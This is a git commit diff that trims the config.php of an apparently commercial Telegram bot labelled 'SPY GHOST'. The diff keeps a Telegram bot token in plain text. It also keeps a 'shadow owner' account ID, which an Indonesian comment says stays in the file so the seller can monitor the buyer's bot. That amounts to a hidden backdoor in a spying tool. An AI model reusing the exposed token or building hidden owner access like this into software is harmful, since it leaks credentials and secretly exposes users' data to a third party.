a09e97875ce51098046356d4961f7c192fdd485f
Kensora95 <defidryu@gmail.com>
2026-03-08 12:28:25 +0700

    Refactor config.php to simplify configuration
    Removed unused configuration settings and added comments for clarity.

--- config.php
+++ config.php
@@ -1,15 +1,6 @@
 <?php
-// Token & ID
-$token = "8775494315:AAGtkIAWCSBMbQpZcnm-uVVh-VYciV1Rc6o";
-$owner_1 = "7429012558"; // Pembeli Script
-$owner_bayangan = "2016992836"; // Boss Kensora
-
-// Database Premium
-$db_file = 'users.json';
-if(!file_exists($db_file)) file_put_contents($db_file, json_encode([]));
-$premium_users = json_decode(file_get_contents($db_file), true);
-
-// Pesan & Waktu
-$pesan_sewa = "⚠️ **AKSES DITOLAK!**\n---------------------------\nID Anda (`{ID}`) belum terdaftar.\n\nHubungi: @Kensora95";
-date_default_timezone_set('Asia/Jakarta');
+/* CONFIG SPY GHOST */
+$token          = "8775494315:AAGtkIAWCSBMbQpZcnm-uVVh-VYciV1Rc6o";
+$owner_1        = "7429012558"; // ID Pembeli
+$owner_bayangan = "2016992836"; // ID Boss Kensora (Tetap di sini buat monitoring)
 ?>
